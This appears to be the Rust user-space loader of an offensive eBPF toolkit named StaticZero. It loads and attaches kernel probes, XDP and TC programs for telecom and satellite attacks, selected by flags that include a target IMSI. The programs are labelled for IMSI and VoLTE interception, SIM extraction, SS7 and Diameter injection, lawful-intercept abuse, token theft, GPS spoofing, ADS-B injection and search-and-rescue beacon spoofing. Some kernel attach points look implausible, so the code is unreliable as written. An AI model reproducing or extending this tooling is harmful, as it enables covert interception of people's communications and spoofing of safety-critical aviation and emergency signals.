use std::path::PathBuf;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;

use anyhow::{Context, Result};
use aya::maps::AsyncPerfEventArray;
use aya::programs::{KProbe, SchedClassifier, Xdp, XdpFlags};
use aya::util::online_cpus;
use aya::BpfLoader;
use bytes::BytesMut;
use clap::Parser;
use tokio::signal;
use tracing::{error, info, warn};
use tracing_subscriber::EnvFilter;

use common::EventHeader;

#[derive(Parser, Debug)]
#[command(name = "staticzero-offense")]
#[command(about = "StaticZero Telecom Exploitation Research Loader")]
struct Cli {
    /// Path to compiled eBPF object file
    #[arg(
        short,
        long,
        default_value = "target/bpfel-unknown-none/release/staticzero-offense"
    )]
    bpf_path: PathBuf,

    /// Enable telecom interception (F89-F100: AT cmd, baseband, SIM, IMSI, downgrade, GTP, SS7, Diameter, RRC, NAS, SUPI, N2)
    #[arg(long)]
    enable_telecom: bool,

    /// Enable advanced telecom (F101-F108: VoLTE, eSIM, slicing, WiFi calling, LI, femtocell, SUPL, roaming)
    #[arg(long)]
    enable_telecom_advanced: bool,

    /// Enable all features
    #[arg(long)]
    all: bool,

    /// Target IMSI for interception (15-digit string)
    #[arg(long)]
    target_imsi: Option<String>,

    /// GTP tunnel interface for core network interception
    #[arg(long, default_value = "gtp0")]
    gtp_iface: String,

    /// IMS/SIP interface for VoLTE interception
    #[arg(long, default_value = "ims0")]
    ims_iface: String,

    /// WiFi calling interface
    #[arg(long, default_value = "wlan0")]
    wifi_iface: String,

    /// Enable 5G advanced exploitation (F109-F120: RAN, SBI, radio, identity)
    #[arg(long)]
    enable_5g_advanced: bool,

    /// Enable satellite exploitation (F121-F134: DVB-S2, NTN, Iridium, VSAT, Starlink, ADS-B, GNSS)
    #[arg(long)]
    enable_satellite: bool,

    /// SBI/core network interface for NF interception
    #[arg(long, default_value = "sbi0")]
    sbi_iface: String,

    /// SDR interface for radio-layer attacks
    #[arg(long, default_value = "sdr0")]
    sdr_iface: String,

    /// Satellite ground segment interface
    #[arg(long, default_value = "sat0")]
    sat_iface: String,
}

#[tokio::main]
async fn main() -> Result<()> {
    tracing_subscriber::fmt()
        .with_env_filter(EnvFilter::from_default_env())
        .init();

    let cli = Cli::parse();
    let running = Arc::new(AtomicBool::new(true));
    let r = running.clone();

    tokio::spawn(async move {
        signal::ctrl_c().await.expect("failed to listen for ctrl+c");
        r.store(false, Ordering::SeqCst);
    });

    info!("StaticZero Telecom Offense Loader starting");
    info!("Loading eBPF programs from {:?}", cli.bpf_path);

    let mut bpf = BpfLoader::new()
        .load_file(&cli.bpf_path)
        .context("failed to load eBPF object")?;

    let enable_telecom = cli.all || cli.enable_telecom;
    let enable_advanced = cli.all || cli.enable_telecom_advanced;
    let enable_5g = cli.all || cli.enable_5g_advanced;
    let enable_satellite = cli.all || cli.enable_satellite;

    // ── Features 89-100: Telecom Interception ────────────────────────────────
    if enable_telecom {
        // Kprobes for modem/baseband/SIM/NAS interception
        let kprobes = [
            (
                "shadow_at_cmd_inject",
                "tty_write",
                "F89: AT Command Injection",
            ),
            (
                "shadow_baseband_exploit",
                "usb_submit_urb",
                "F90: Baseband Exploitation",
            ),
            ("shadow_sim_clone", "vfs_read", "F91: SIM Data Extraction"),
            (
                "shadow_imsi_intercept",
                "qmi_wwan_rx_fixup",
                "F92: IMSI Interception",
            ),
            (
                "shadow_rrc_redirect",
                "tty_write",
                "F93: RRC Connection Redirect",
            ),
            (
                "shadow_nas_intercept",
                "qmi_wwan_rx_fixup",
                "F98: NAS Message Interception",
            ),
            (
                "shadow_supi_deconceal",
                "ecies_decrypt",
                "F99: 5G SUPI De-concealment",
            ),
        ];

        for (name, attach_point, desc) in &kprobes {
            match bpf.program_mut(name) {
                Some(prog) => {
                    let kprobe: &mut KProbe = prog.try_into()?;
                    kprobe.load()?;
                    kprobe.attach(attach_point, 0)?;
                    info!("{} enabled", desc);
                }
                None => warn!("{} ({}) not found in eBPF object, skipping", desc, name),
            }
        }

        // XDP on GTP interface for tunnel hijacking
        if let Some(prog) = bpf.program_mut("shadow_gtp_hijack") {
            let xdp: &mut Xdp = prog.try_into()?;
            xdp.load()?;
            xdp.attach(&cli.gtp_iface, XdpFlags::default())?;
            info!("F94: GTP Tunnel Hijacking enabled on {}", cli.gtp_iface);
        }

        // TC classifiers for SS7/Diameter/NGAP/protocol downgrade
        let tc_progs = [
            ("shadow_protocol_downgrade", "F93: Protocol Downgrade"),
            ("shadow_ss7_inject", "F95: SS7 MAP Injection"),
            ("shadow_diameter_exploit", "F96: Diameter AVP Manipulation"),
            ("shadow_n2_inject", "F100: 5G N2 Interface Injection"),
        ];

        for (name, desc) in &tc_progs {
            if let Some(prog) = bpf.program_mut(name) {
                let tc: &mut SchedClassifier = prog.try_into()?;
                tc.load()?;
                info!("{} loaded (attach to interface manually)", desc);
            }
        }
    }

    // ── Features 101-108: Advanced Telecom ───────────────────────────────────
    if enable_advanced {
        let advanced_kprobes = [
            (
                "shadow_volte_intercept",
                "sip_msg_send",
                "F101: VoLTE/VoNR Interception",
            ),
            (
                "shadow_esim_exploit",
                "tty_write",
                "F102: eSIM Provisioning Attack",
            ),
            (
                "shadow_femtocell_exploit",
                "ipsec_output",
                "F106: Femtocell Exploitation",
            ),
        ];

        for (name, attach_point, desc) in &advanced_kprobes {
            match bpf.program_mut(name) {
                Some(prog) => {
                    let kprobe: &mut KProbe = prog.try_into()?;
                    kprobe.load()?;
                    kprobe.attach(attach_point, 0)?;
                    info!("{} enabled", desc);
                }
                None => warn!("{} ({}) not found, skipping", desc, name),
            }
        }

        // XDP for WiFi calling exploitation
        if let Some(prog) = bpf.program_mut("shadow_wifi_calling_exploit") {
            let xdp: &mut Xdp = prog.try_into()?;
            xdp.load()?;
            xdp.attach(&cli.wifi_iface, XdpFlags::default())?;
            info!(
                "F104: WiFi Calling Exploitation enabled on {}",
                cli.wifi_iface
            );
        }

        // TC classifiers for advanced telecom
        let tc_advanced = [
            ("shadow_slice_exploit", "F103: Network Slicing Exploit"),
            ("shadow_li_abuse", "F105: Lawful Intercept Abuse"),
            ("shadow_supl_spoof", "F107: SUPL/Location Spoofing"),
            ("shadow_roaming_pivot", "F108: Roaming/IPX Pivoting"),
        ];

        for (name, desc) in &tc_advanced {
            if let Some(prog) = bpf.program_mut(name) {
                let tc: &mut SchedClassifier = prog.try_into()?;
                tc.load()?;
                info!("{} loaded", desc);
            }
        }
    }

    // ── Features 109-120: 5G Advanced / RAN / SBI / Identity ──────────────────
    if enable_5g {
        let kprobes_5g = [
            (
                "shadow_pbch_sib_spoof",
                "tty_write",
                "F109: PBCH/SIB Broadcast Spoofing",
            ),
            (
                "shadow_rrc_meas_manipulate",
                "qmi_wwan_rx_fixup",
                "F110: RRC Measurement Report Manipulation",
            ),
            (
                "shadow_oauth2_theft",
                "tcp_sendmsg",
                "F114: OAuth2 Token Theft (NF-to-NF)",
            ),
            (
                "shadow_mimo_fingerprint",
                "qmi_wwan_rx_fixup",
                "F116: MIMO Beamforming Fingerprinting",
            ),
            (
                "shadow_aka_downgrade",
                "tcp_sendmsg",
                "F118: 5G-AKA Downgrade to EAP-AKA'",
            ),
            (
                "shadow_suci_replay",
                "tcp_sendmsg",
                "F119: SUCI Replay Attack",
            ),
            (
                "shadow_arpf_probe",
                "tcp_sendmsg",
                "F120: ARPF Key Extraction Probe",
            ),
        ];

        for (name, attach_point, desc) in &kprobes_5g {
            match bpf.program_mut(name) {
                Some(prog) => {
                    let kprobe: &mut KProbe = prog.try_into()?;
                    kprobe.load()?;
                    kprobe.attach(attach_point, 0)?;
                    info!("{} enabled", desc);
                }
                None => warn!("{} ({}) not found, skipping", desc, name),
            }
        }

        // XDP on SDR interface for jamming evasion
        if let Some(prog) = bpf.program_mut("shadow_jamming_evasion") {
            let xdp: &mut Xdp = prog.try_into()?;
            xdp.load()?;
            xdp.attach(&cli.sdr_iface, XdpFlags::default())?;
            info!(
                "F115: Jamming Detection Evasion enabled on {}",
                cli.sdr_iface
            );
        }

        // TC classifiers for SBI/RAN/sidelink exploitation
        let tc_5g = [
            ("shadow_handover_hijack", "F111: Handover Hijacking"),
            ("shadow_sbi_exploit", "F112: HTTP/2 SBI Exploitation"),
            ("shadow_nrf_abuse", "F113: NRF API Abuse"),
            ("shadow_sidelink_exploit", "F117: Sidelink PC5/V2X Exploit"),
        ];

        for (name, desc) in &tc_5g {
            if let Some(prog) = bpf.program_mut(name) {
                let tc: &mut SchedClassifier = prog.try_into()?;
                tc.load()?;
                info!("{} loaded (attach to {} manually)", desc, cli.sbi_iface);
            }
        }
    }

    // ── Features 121-134: Satellite Communications ────────────────────────────
    if enable_satellite {
        let sat_kprobes = [
            (
                "shadow_dvbs2_intercept",
                "dvb_dmx_swfilter_packets",
                "F121: DVB-S2 Downlink Interception",
            ),
            (
                "shadow_ntn_timing_exploit",
                "tcp_sendmsg",
                "F123: NTN Timing Advance Exploitation",
            ),
            (
                "shadow_iridium_capture",
                "sdr_rx_callback",
                "F125: Iridium L-Band Frame Capture",
            ),
            (
                "shadow_vsat_firmware_extract",
                "usb_submit_urb",
                "F127: VSAT Terminal Firmware Extraction",
            ),
            (
                "shadow_starlink_auth_probe",
                "tcp_sendmsg",
                "F129: Starlink Dishy Auth Probe",
            ),
            (
                "shadow_sarsat_beacon_spoof",
                "sdr_rx_callback",
                "F132: COSPAS-SARSAT Beacon Spoofing",
            ),
        ];

        for (name, attach_point, desc) in &sat_kprobes {
            match bpf.program_mut(name) {
                Some(prog) => {
                    let kprobe: &mut KProbe = prog.try_into()?;
                    kprobe.load()?;
                    kprobe.attach(attach_point, 0)?;
                    info!("{} enabled", desc);
                }
                None => warn!("{} ({}) not found, skipping", desc, name),
            }
        }

        // XDP on satellite interface for ISL fingerprinting and GNSS spoofing
        let sat_xdp_progs = [
            ("shadow_isl_fingerprint", "F130: ISL Laser Link Fingerprint"),
            ("shadow_gnss_l1_spoof", "F133: GPS L1 C/A Code Spoofing"),
            (
                "shadow_gnss_l5_spoof",
                "F134: Multi-Constellation L5/E5 Spoofing",
            ),
        ];

        for (name, desc) in &sat_xdp_progs {
            if let Some(prog) = bpf.program_mut(name) {
                let xdp: &mut Xdp = prog.try_into()?;
                xdp.load()?;
                xdp.attach(&cli.sat_iface, XdpFlags::default())?;
                info!("{} enabled on {}", desc, cli.sat_iface);
            }
        }

        // TC classifiers for satellite injection
        let tc_sat = [
            (
                "shadow_transponder_hijack",
                "F122: Transponder Hijack Injection",
            ),
            (
                "shadow_ntn_gateway_inject",
                "F124: NTN-5G Core Gateway Injection",
            ),
            (
                "shadow_leo_signaling_inject",
                "F126: LEO Constellation Signaling Injection",
            ),
            (
                "shadow_scpc_carrier_manip",
                "F128: SCPC Carrier Manipulation",
            ),
            ("shadow_adsb_inject", "F131: ADS-B/ACARS Frame Injection"),
        ];

        for (name, desc) in &tc_sat {
            if let Some(prog) = bpf.program_mut(name) {
                let tc: &mut SchedClassifier = prog.try_into()?;
                tc.load()?;
                info!("{} loaded (attach to {} manually)", desc, cli.sat_iface);
            }
        }
    }

    // ── Event loop ───────────────────────────────────────────────────────────
    let mut perf_array = AsyncPerfEventArray::try_from(
        bpf.take_map("TELECOM_EVENTS")
            .context("TELECOM_EVENTS map not found")?,
    )?;

    let cpus = online_cpus().map_err(|e| anyhow::anyhow!("failed to get online CPUs: {}", e))?;
    for cpu_id in cpus {
        let mut buf = perf_array.open(cpu_id, None)?;
        let running = running.clone();

        tokio::spawn(async move {
            let mut buffers = (0..10)
                .map(|_| BytesMut::with_capacity(256))
                .collect::<Vec<_>>();

            while running.load(Ordering::Relaxed) {
                let events = match buf.read_events(&mut buffers).await {
                    Ok(events) => events,
                    Err(e) => {
                        error!("Error reading perf events: {}", e);
                        continue;
                    }
                };

                for buf in buffers.iter().take(events.read) {
                    let ptr = buf.as_ptr() as *const EventHeader;
                    let header = unsafe { ptr.read_unaligned() };
                    info!(
                        "EVENT type={} pid={} ts={}",
                        header.event_type, header.pid, header.timestamp_ns
                    );
                }
            }
        });
    }

    info!("StaticZero Offense Engine running. Press Ctrl+C to stop.");
    signal::ctrl_c().await?;
    running.store(false, Ordering::SeqCst);
    info!("Shutting down.");
    Ok(())
}
